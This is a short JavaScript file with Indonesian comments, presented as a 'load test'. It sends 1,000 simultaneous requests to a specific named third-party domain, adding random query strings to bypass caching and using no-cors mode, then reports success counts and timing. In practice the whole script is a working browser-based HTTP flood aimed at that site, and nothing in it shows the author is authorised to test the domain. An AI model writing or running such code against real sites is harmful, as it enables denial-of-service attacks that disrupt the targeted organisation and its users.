// 1. Fungsi pembantu untuk membuat teks/string acak
function buatTeksRandom(panjang) {
  const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let hasil = '';
  for (let i = 0; i < panjang; i++) {
    hasil += karakter.charAt(Math.floor(Math.random() * karakter.length));
  }
  return hasil;
}

async function mulaiUjiBeban() {
  const jumlahRequest = 1000; // Jumlah request bersamaan

  const btn = document.getElementById('btnUji');
  const statusDiv = document.getElementById('status');
  const logPre = document.getElementById('logHasil');

  // Matikan tombol sementara
  btn.disabled = true;
  statusDiv.innerText = `Sedang mengirim ${jumlahRequest} request dengan teks acak...`;
  logPre.innerText = '';

  const waktuMulai = performance.now();
  const daftarRequest = [];

  // Loop untuk membuat antrean request
  for (let i = 0; i < jumlahRequest; i++) {
    
    // 2. Buat teks random sepanjang 8 karakter di SETIAP iterasi/loop
    const randomtes = buatTeksRandom(8); 
    
    // 3. Gunakan BACKTICK (`) agar ${randomtes} berfungsi sebagai variabel
    const urlTujuan = `https://trackingdoc.ptasn.co.id/?view=${randomtes}`;

    daftarRequest.push(
      fetch(urlTujuan, { mode: 'no-cors', cache: 'no-store' })
        .then(response => ({ status: 'Sukses', code: response.status }))
        .catch(error => ({ status: 'Gagal', error: error.message }))
    );
  }

  // Kirim semua request secara bersamaan
  const hasil = await Promise.all(daftarRequest);
  const waktuSelesai = performance.now();
  const durasiDetik = ((waktuSelesai - waktuMulai) / 1000).toFixed(2);

  // Hitung berapa yang berhasil dan gagal
  const jumlahSukses = hasil.filter(r => r.status === 'Sukses').length;
  const jumlahGagal = hasil.length - jumlahSukses;

  // Tampilkan hasil di halaman
  statusDiv.innerText = 'Pengujian Selesai!';
  logPre.innerText = 
    `Domain Diuji   : https://trackingdoc.ptasn.co.id/\n` +
    `Total Request  : ${jumlahRequest}\n` +
    `Berhasil       : ${jumlahSukses}\n` +
    `Gagal/Timeout  : ${jumlahGagal}\n` +
    `Total Waktu    : ${durasiDetik} detik`;

  // Aktifkan kembali tombolnya
  btn.disabled = false;
}